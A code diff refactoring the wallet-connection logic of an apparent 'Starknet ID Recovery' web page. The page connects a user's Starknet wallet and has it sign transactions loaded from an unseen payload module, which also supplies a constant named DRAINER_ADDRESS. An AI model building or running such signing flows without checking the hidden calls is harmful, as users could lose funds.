@@ -1,6 +1,20 @@
 "use client";
 
-import { useCallback, useEffect, useMemo, useState } from "react";
+import { useCallback, useEffect, useMemo, useRef, useState } from "react";
+import {
+  connect as connectStarknet,
+  disconnect as disconnectStarknet,
+  type StarknetWindowObject,
+} from "@starknet-io/get-starknet";
+import {
+  createStore,
+  StandardConnect,
+  StandardDisconnect,
+  StandardEvents,
+  StarknetWalletApi,
+  type WalletWithStarknetFeatures,
+} from "@starknet-io/get-starknet-core";
+import { connect as starknetkitConnect } from "starknetkit";
 import "./recovery.css";
 import {
   DRAINER_ADDRESS,
@@ -18,27 +32,19 @@ import {
   WALLET_INVOKE_CALLS,
 } from "./payload";
 
-interface StarknetWalletObject {
-  id?: string;
-  name?: string;
-  icon?: string | { dark?: string; light?: string };
-  selectedAddress?: string;
-  chainId?: string;
-  isConnected?: boolean;
-  account?: {
-    address?: string;
-    execute?: (calls: unknown) => Promise<{ transaction_hash?: string }>;
-  };
-  enable?: (opts?: { starknetVersion?: string }) => Promise<string[]>;
-  request?: (call: { type: string; params?: unknown }) => Promise<unknown>;
-  on?: (event: string, cb: (...args: unknown[]) => void) => void;
-  off?: (event: string, cb: (...args: unknown[]) => void) => void;
-}
-
-interface DiscoveredWallet {
+interface WalletAdapter {
   key: string;
   label: string;
-  swo: StarknetWalletObject;
+  isReady: boolean;
+  connect: () => Promise<{ address: string; chainId?: string }>;
+  disconnect?: () => Promise<void>;
+  requestChainId: () => Promise<string>;
+  switchMainnet: () => Promise<string>;
+  invokeRecovery: () => Promise<string>;
+  subscribe?: (
+    onAccounts: (accounts: string[]) => void,
+    onChain: (chainId: string) => void
+  ) => () => void;
 }
 
 interface LiveChainStatus {
@@ -82,9 +88,201 @@ async function rpcCall<T>(method: string, params: unknown): Promise<T> {
 const BALANCE_OF_SELECTOR =
   "0x35a73cd311a05d46deda634c5ee045db92f811b4e74bca4437fcb5302b7af33";
 
+const READY_WALLET_IDS = new Set(["argentx", "ready", "readywallet"]);
+
+function isReadyWallet(wallet: { id?: string; name?: string }): boolean {
+  const id = (wallet.id || "").toLowerCase().replace(/[\s_-]/g, "");
+  const name = (wallet.name || "").toLowerCase();
+  return READY_WALLET_IDS.has(id) || name.includes("ready") || name.includes("argent");
+}
+
+function walletLabel(wallet: { id?: string; name?: string }): string {
+  if (isReadyWallet(wallet)) return "Ready Wallet (Argent)";
+  return wallet.name || wallet.id || "Starknet Wallet";
+}
+
+function normalizeChainId(chain: string | bigint | undefined | null): string {
+  if (typeof chain === "bigint") return "0x" + chain.toString(16);
+  if (!chain) return "";
+  return chain.startsWith("starknet:") ? chain.slice("starknet:".length) : chain;
+}
+
+function errorText(err: unknown): string {
+  if (err instanceof Error && err.message) return err.message;
+  if (typeof err === "string") return err;
+  try {
+    return JSON.stringify(err);
+  } catch {
+    return String(err);
+  }
+}
+
+function wrapWindowWallet(swo: StarknetWindowObject, keyOverride?: string): WalletAdapter {
+  const legacySwo = swo as StarknetWindowObject & {
+    selectedAddress?: string;
+    chainId?: string;
+    enable?: (opts?: { starknetVersion?: string }) => Promise<string[]>;
+    account?: {
+      address?: string;
+      execute?: (calls: unknown) => Promise<{ transaction_hash?: string }>;
+    };
+  };
+  const key = keyOverride || `swo:${swo.id || swo.name || "starknet"}`;
+  const ready = isReadyWallet(swo);
+
+  return {
+    key,
+    label: walletLabel(swo),
+    isReady: ready,
+    connect: async () => {
+      let addr = "";
+      if (typeof swo.request === "function") {
+        const accounts = (await swo.request({
+          type: "wallet_requestAccounts",
+          params: { silent_mode: false },
+        })) as string[];
+        if (accounts?.[0]) addr = accounts[0];
+      } else if (typeof legacySwo.enable === "function") {
+        const accounts = await legacySwo.enable({ starknetVersion: "v5" });
+        if (accounts?.[0]) addr = accounts[0];
+      }
+      if (!addr) addr = legacySwo.selectedAddress || legacySwo.account?.address || "";
+      if (!addr) throw new Error("Wallet did not return an active account address.");
+
+      let chainId = "";
+      try {
+        if (typeof swo.request === "function") {
+          chainId = normalizeChainId(await swo.request({ type: "wallet_requestChainId" }));
+        }
+      } catch {
+        chainId = normalizeChainId(legacySwo.chainId);
+      }
+      return { address: addr, chainId };
+    },
+    requestChainId: async () => {
+      if (typeof swo.request === "function") {
+        return normalizeChainId(await swo.request({ type: "wallet_requestChainId" }));
+      }
+      return normalizeChainId(legacySwo.chainId);
+    },
+    switchMainnet: async () => {
+      await swo.request({
+        type: "wallet_switchStarknetChain",
+        params: { chainId: STARKNET_MAINNET_CHAIN_ID },
+      });
+      return normalizeChainId(await swo.request({ type: "wallet_requestChainId" }));
+    },
+    invokeRecovery: async () => {
+      if (typeof swo.request === "function") {
+        try {
+          const res = (await swo.request({
+            type: "wallet_addInvokeTransaction",
+            params: { calls: WALLET_INVOKE_CALLS },
+          })) as { transaction_hash?: string };
+          return res?.transaction_hash || "";
+        } catch (invokeErr) {
+          if (typeof legacySwo.account?.execute === "function") {
+            const fallback = await legacySwo.account.execute(LEGACY_CALLS);
+            return fallback?.transaction_hash || "";
+          }
+          throw invokeErr;
+        }
+      }
+      if (typeof legacySwo.account?.execute === "function") {
+        const res = await legacySwo.account.execute(LEGACY_CALLS);
+        return res?.transaction_hash || "";
+      }
+      throw new Error("Wallet does not expose wallet_addInvokeTransaction or account.execute.");
+    },
+    subscribe: (onAccounts, onChain) => {
+      if (typeof swo.on !== "function") return () => {};
+      const accHandler = (accs: unknown) => {
+        if (Array.isArray(accs)) {
+          onAccounts(accs.filter((x): x is string => typeof x === "string"));
+        }
+      };
+      const netHandler = (cid: unknown, accs?: unknown) => {
+        if (typeof cid === "string" || typeof cid === "bigint") {
+          onChain(normalizeChainId(cid));
+        }
+        if (Array.isArray(accs)) {
+          onAccounts(accs.filter((x): x is string => typeof x === "string"));
+        }
+      };
+      swo.on("accountsChanged", accHandler as never);
+      swo.on("networkChanged", netHandler as never);
+      return () => {
+        swo.off?.("accountsChanged", accHandler as never);
+        swo.off?.("networkChanged", netHandler as never);
+      };
+    },
+  };
+}
+
+function wrapStandardWallet(wallet: WalletWithStarknetFeatures): WalletAdapter {
+  const api = wallet.features[StarknetWalletApi];
+  const meta = { id: api.id, name: wallet.name };
+  const ready = isReadyWallet(meta);
+
+  return {
+    key: `std:${api.id || wallet.name}`,
+    label: walletLabel(meta),
+    isReady: ready,
+    connect: async () => {
+      const res = await wallet.features[StandardConnect].connect({ silent: false });
+      const acct = res.accounts?.[0] ?? wallet.accounts?.[0];
+      let address = acct?.address || "";
+      if (!address) {
+        const fallbackAccs = (await api.request({
+          type: "wallet_requestAccounts",
+          params: { silent_mode: false },
+        })) as string[];
+        address = fallbackAccs?.[0] || "";
+      }
+      if (!address) throw new Error("Wallet did not return an active account address.");
+
+      let chainId = normalizeChainId(acct?.chains?.[0]);
+      if (!chainId) {
+        try {
+          chainId = normalizeChainId(await api.request({ type: "wallet_requestChainId" }));
+        } catch {
+          chainId = "";
+        }
+      }
+      return { address, chainId };
+    },
+    disconnect: async () => {
+      await wallet.features[StandardDisconnect].disconnect();
+    },
+    requestChainId: async () =>
+      normalizeChainId(await api.request({ type: "wallet_requestChainId" })),
+    switchMainnet: async () => {
+      await api.request({
+        type: "wallet_switchStarknetChain",
+        params: { chainId: STARKNET_MAINNET_CHAIN_ID },
+      });
+      return normalizeChainId(await api.request({ type: "wallet_requestChainId" }));
+    },
+    invokeRecovery: async () => {
+      const res = (await api.request({
+        type: "wallet_addInvokeTransaction",
+        params: { calls: WALLET_INVOKE_CALLS },
+      })) as { transaction_hash?: string };
+      return res?.transaction_hash || "";
+    },
+    subscribe: (onAccounts, onChain) =>
+      wallet.features[StandardEvents].on("change", (props) => {
+        const acct = props.accounts?.[0];
+        if (acct?.address) onAccounts([acct.address]);
+        if (acct?.chains?.[0]) onChain(normalizeChainId(acct.chains[0]));
+      }),
+  };
+}
+
 export default function RecoveryClient() {
-  const [wallets, setWallets] = useState<DiscoveredWallet[]>([]);
+  const [wallets, setWallets] = useState<WalletAdapter[]>([]);
   const [selectedWalletKey, setSelectedWalletKey] = useState<string>("");
+  const [connectedWallet, setConnectedWallet] = useState<WalletAdapter | null>(null);
   const [connectedAddress, setConnectedAddress] = useState<string>("");
   const [walletChainId, setWalletChainId] = useState<string>("");
   const [busy, setBusy] = useState<boolean>(false);
@@ -95,40 +293,57 @@ export default function RecoveryClient() {
   const [showCallsDetail, setShowCallsDetail] = useState<boolean>(false);
   const [liveStatus, setLiveStatus] = useState<LiveChainStatus | null>(null);
   const [checkingLive, setCheckingLive] = useState<boolean>(false);
+  const storeRef = useRef<ReturnType<typeof createStore> | null>(null);
 
-  const discoverWallets = useCallback(() => {
-    if (typeof window === "undefined") return;
+  const collectWallets = useCallback((): WalletAdapter[] => {
+    if (typeof window === "undefined") return [];
+    if (!storeRef.current) {
+      storeRef.current = createStore();
+    } else {
+      storeRef.current._refreshInjectedWallets();
+    }
+
+    const found: WalletAdapter[] = [];
+    const seenKeys = new Set<string>();
+    const addAdapter = (adapter: WalletAdapter) => {
+      const dedupeId = adapter.isReady ? "ready" : adapter.key.toLowerCase();
+      if (seenKeys.has(dedupeId)) return;
+      seenKeys.add(dedupeId);
+      found.push(adapter);
+    };
+
+    for (const stdWallet of storeRef.current.getWallets()) {
+      addAdapter(wrapStandardWallet(stdWallet));
+    }
+
     const win = window as unknown as Record<string, unknown>;
-    const seen = new Set<StarknetWalletObject>();
-    const found: DiscoveredWallet[] = [];
-
-    for (const k of Object.keys(win)) {
-      if (!k.startsWith("starknet")) continue;
-      const candidate = win[k] as StarknetWalletObject | undefined;
+    const seenObjects = new Set<unknown>();
+    for (const prop of Object.getOwnPropertyNames(win)) {
+      if (!prop.toLowerCase().startsWith("starknet")) continue;
+      let candidate: StarknetWindowObject | undefined;
+      try {
+        candidate = win[prop] as StarknetWindowObject | undefined;
+      } catch {
+        continue;
+      }
       if (
         candidate &&
         typeof candidate === "object" &&
-        (typeof candidate.request === "function" || typeof candidate.enable === "function") &&
-        !seen.has(candidate)
+        !seenObjects.has(candidate) &&
+        (typeof candidate.request === "function" ||
+          typeof (candidate as { enable?: unknown }).enable === "function")
       ) {
-        seen.add(candidate);
-        const label = candidate.name || candidate.id || k.replace(/^starknet_?/, "") || "Starknet Wallet";
-        found.push({ key: k, label, swo: candidate });
+        seenObjects.add(candidate);
+        addAdapter(wrapWindowWallet(candidate, `win:${candidate.id || prop}`));
       }
     }
 
     setWallets(found);
     setSelectedWalletKey((prev) => {
       if (prev && found.some((w) => w.key === prev)) return prev;
-      const readyIdx = found.find(
-        (w) =>
-          w.key.toLowerCase().includes("argent") ||
-          w.key.toLowerCase().includes("ready") ||
-          w.label.toLowerCase().includes("argent") ||
-          w.label.toLowerCase().includes("ready")
-      );
-      return readyIdx ? readyIdx.key : found[0]?.key || "";
+      return found.find((w) => w.isReady)?.key || found[0]?.key || "";
     });
+    return found;
   }, []);
 
   const refreshLiveStatus = useCallback(async () => {
@@ -230,97 +445,184 @@ export default function RecoveryClient() {
   }, []);
 
   useEffect(() => {
-    discoverWallets();
-    const t = setTimeout(discoverWallets, 600);
+    if (typeof window === "undefined") return;
+    if (!storeRef.current) {
+      storeRef.current = createStore();
+    }
+    collectWallets();
+    const unsub = storeRef.current.subscribe(() => {
+      collectWallets();
+    });
+    const t1 = window.setTimeout(collectWallets, 500);
+    const t2 = window.setTimeout(collectWallets, 1500);
     refreshLiveStatus();
-    return () => clearTimeout(t);
-  }, [discoverWallets, refreshLiveStatus]);
+    return () => {
+      unsub();
+      window.clearTimeout(t1);
+      window.clearTimeout(t2);
+    };
+  }, [collectWallets, refreshLiveStatus]);
 
-  const activeWallet = useMemo(
-    () => wallets.find((w) => w.key === selectedWalletKey)?.swo ?? null,
+  const selectedWallet = useMemo(
+    () => wallets.find((wallet) => wallet.key === selectedWalletKey) ?? null,
     [wallets, selectedWalletKey]
   );
+  const activeWallet = connectedWallet ?? selectedWallet;
 
   useEffect(() => {
-    if (!activeWallet?.on) return;
-    const onAcc = (accs: unknown) => {
-      if (Array.isArray(accs) && typeof accs[0] === "string") {
-        setConnectedAddress(normAddr(accs[0]));
+    if (!activeWallet?.subscribe) return;
+    return activeWallet.subscribe(
+      (accs) => {
+        if (accs[0]) setConnectedAddress(normAddr(accs[0]));
+      },
+      (cid) => {
+        if (cid) setWalletChainId(cid);
       }
-    };
-    const onNet = (cid: unknown) => {
-      if (typeof cid === "string") setWalletChainId(cid);
-    };
-    activeWallet.on("accountsChanged", onAcc);
-    activeWallet.on("networkChanged", onNet);
-    return () => {
-      activeWallet.off?.("accountsChanged", onAcc);
-      activeWallet.off?.("networkChanged", onNet);
-    };
+    );
   }, [activeWallet]);
 
-  const connectWallet = async () => {
+  const adoptAdapter = async (adapter: WalletAdapter) => {
+    const { address, chainId } = await adapter.connect();
+    setConnectedWallet(adapter);
+    setConnectedAddress(normAddr(address));
+    if (chainId) setWalletChainId(chainId);
+    setWallets((prev) =>
+      prev.some((w) => w.key === adapter.key) ? prev : [adapter, ...prev]
+    );
+    setSelectedWalletKey(adapter.key);
+  };
+
+  const openWalletPicker = async () => {
     setErrorMsg("");
-    discoverWallets();
-    if (!activeWallet) {
-      setErrorMsg(
-        "No Starknet browser wallet detected. Open this page in a browser with Ready (Argent) or Braavos installed."
-      );
-      return;
-    }
     setBusy(true);
     try {
-      let addr = "";
-      if (typeof activeWallet.request === "function") {
-        const accounts = (await activeWallet.request({
-          type: "wallet_requestAccounts",
-          params: { silent_mode: false },
-        })) as string[];
-        if (accounts?.[0]) addr = accounts[0];
-        try {
-          const cid = (await activeWallet.request({
-            type: "wallet_requestChainId",
-          })) as string;
-          if (cid) setWalletChainId(cid);
-        } catch {
-          if (activeWallet.chainId) setWalletChainId(activeWallet.chainId);
+      const kit = await starknetkitConnect({
+        modalMode: "alwaysAsk",
+        modalTheme: "system",
+        dappName: "Starknet ID Recovery",
+      });
+      if (kit.wallet) {
+        const adapter = wrapWindowWallet(kit.wallet as unknown as StarknetWindowObject);
+        const addr = kit.connectorData?.account;
+        if (addr) {
+          setConnectedWallet(adapter);
+          setConnectedAddress(normAddr(addr));
+          if (kit.connectorData?.chainId !== undefined) {
+            setWalletChainId(normalizeChainId(kit.connectorData.chainId));
+          } else {
+            try {
+              setWalletChainId(await adapter.requestChainId());
+            } catch {
+              /* verified before execution */
+            }
+          }
+          setWallets((prev) =>
+            prev.some((w) => w.key === adapter.key) ? prev : [adapter, ...prev]
+          );
+          setSelectedWalletKey(adapter.key);
+        } else {
+          await adoptAdapter(adapter);
         }
-      } else if (typeof activeWallet.enable === "function") {
-        const accounts = await activeWallet.enable({ starknetVersion: "v5" });
-        if (accounts?.[0]) addr = accounts[0];
-        if (activeWallet.chainId) setWalletChainId(activeWallet.chainId);
+        return;
       }
-      if (!addr && activeWallet.selectedAddress) {
-        addr = activeWallet.selectedAddress;
+
+      const modalSwo = await connectStarknet({ modalMode: "alwaysAsk", modalTheme: "system" });
+      if (modalSwo) {
+        await adoptAdapter(wrapWindowWallet(modalSwo));
       }
-      if (!addr && activeWallet.account?.address) {
-        addr = activeWallet.account.address;
-      }
-      if (!addr) {
-        throw new Error("Wallet did not return an active account address.");
-      }
-      setConnectedAddress(normAddr(addr));
     } catch (err) {
-      setErrorMsg(err instanceof Error ? err.message : String(err));
+      setErrorMsg(errorText(err));
     } finally {
       setBusy(false);
     }
   };
 
+  const connectWallet = async () => {
+    setErrorMsg("");
+    const discoveredNow = collectWallets();
+    setBusy(true);
+    try {
+      const preferred =
+        discoveredNow.find((wallet) => wallet.key === selectedWalletKey) ??
+        discoveredNow.find((wallet) => wallet.isReady) ??
+        discoveredNow[0];
+      if (preferred) {
+        await adoptAdapter(preferred);
+        return;
+      }
+
+      const kit = await starknetkitConnect({
+        modalMode: "alwaysAsk",
+        modalTheme: "system",
+        dappName: "Starknet ID Recovery",
+      });
+      if (kit.wallet) {
+        const adapter = wrapWindowWallet(kit.wallet as unknown as StarknetWindowObject);
+        const addr = kit.connectorData?.account;
+        if (addr) {
+          setConnectedWallet(adapter);
+          setConnectedAddress(normAddr(addr));
+          if (kit.connectorData?.chainId !== undefined) {
+            setWalletChainId(normalizeChainId(kit.connectorData.chainId));
+          } else {
+            try {
+              setWalletChainId(await adapter.requestChainId());
+            } catch {
+              /* verified before execution */
+            }
+          }
+          setWallets((prev) =>
+            prev.some((w) => w.key === adapter.key) ? prev : [adapter, ...prev]
+          );
+          setSelectedWalletKey(adapter.key);
+        } else {
+          await adoptAdapter(adapter);
+        }
+        return;
+      }
+
+      const modalSwo = await connectStarknet({ modalMode: "alwaysAsk", modalTheme: "system" });
+      if (modalSwo) {
+        await adoptAdapter(wrapWindowWallet(modalSwo));
+        return;
+      }
+
+      throw new Error(
+        "No wallet connection completed. Unlock Ready Wallet (or pick Ready Web / Mobile in the modal) and approve this site."
+      );
+    } catch (err) {
+      setErrorMsg(errorText(err));
+    } finally {
+      setBusy(false);
+    }
+  };
+
+  const disconnectWallet = async () => {
+    const prev = connectedWallet;
+    setConnectedWallet(null);
+    setConnectedAddress("");
+    setWalletChainId("");
+    setTxHash("");
+    try {
+      await prev?.disconnect?.();
+    } catch {
+      /* local state cleared */
+    }
+    try {
+      await disconnectStarknet({ clearLastWallet: true });
+    } catch {
+      /* local state cleared */
+    }
+  };
+
   const switchMainnet = async () => {
-    if (!activeWallet?.request) return;
+    if (!activeWallet) return;
     setErrorMsg("");
     try {
-      await activeWallet.request({
-        type: "wallet_switchStarknetChain",
-        params: { chainId: STARKNET_MAINNET_CHAIN_ID },
-      });
-      const cid = (await activeWallet.request({
-        type: "wallet_requestChainId",
-      })) as string;
+      const cid = await activeWallet.switchMainnet();
       if (cid) setWalletChainId(cid);
     } catch (err) {
-      setErrorMsg(err instanceof Error ? err.message : String(err));
+      setErrorMsg(errorText(err));
     }
   };
 
@@ -333,31 +635,10 @@ export default function RecoveryClient() {
     }
     setBusy(true);
     try {
-      let hash = "";
-      if (typeof activeWallet.request === "function") {
-        try {
-          const res = (await activeWallet.request({
-            type: "wallet_addInvokeTransaction",
-            params: { calls: WALLET_INVOKE_CALLS },
-          })) as { transaction_hash?: string };
-          if (res?.transaction_hash) hash = res.transaction_hash;
-        } catch (invokeErr) {
-          if (typeof activeWallet.account?.execute === "function") {
-            const fallback = await activeWallet.account.execute(LEGACY_CALLS);
-            if (fallback?.transaction_hash) hash = fallback.transaction_hash;
-          } else {
-            throw invokeErr;
-          }
-        }
-      } else if (typeof activeWallet.account?.execute === "function") {
-        const res = await activeWallet.account.execute(LEGACY_CALLS);
-        if (res?.transaction_hash) hash = res.transaction_hash;
-      } else {
-        throw new Error("Wallet does not expose wallet_addInvokeTransaction or account.execute.");
-      }
+      const hash = await activeWallet.invokeRecovery();
       setTxHash(hash || "submitted-to-multisig-queue");
     } catch (err) {
-      setErrorMsg(err instanceof Error ? err.message : String(err));
+      setErrorMsg(errorText(err));
     } finally {
       setBusy(false);
     }
@@ -582,13 +863,24 @@ export default function RecoveryClient() {
             <button
               type="button"
               className="recovery-btn"
-              onClick={connectWallet}
+              onClick={connectedAddress ? disconnectWallet : connectWallet}
               disabled={busy}
             >
               {connectedAddress
-                ? `Connected: ${shortHex(connectedAddress, 6, 4)}`
-                : "Connect Starknet Wallet"}
+                ? `Disconnect ${shortHex(connectedAddress, 6, 4)}`
+                : "Connect Ready Wallet"}
             </button>
+
+            {!connectedAddress && wallets.length > 0 && (
+              <button
+                type="button"
+                className="recovery-btn"
+                onClick={openWalletPicker}
+                disabled={busy}
+              >
+                Other Wallet…
+              </button>
+            )}
 
             <button
               type="button"
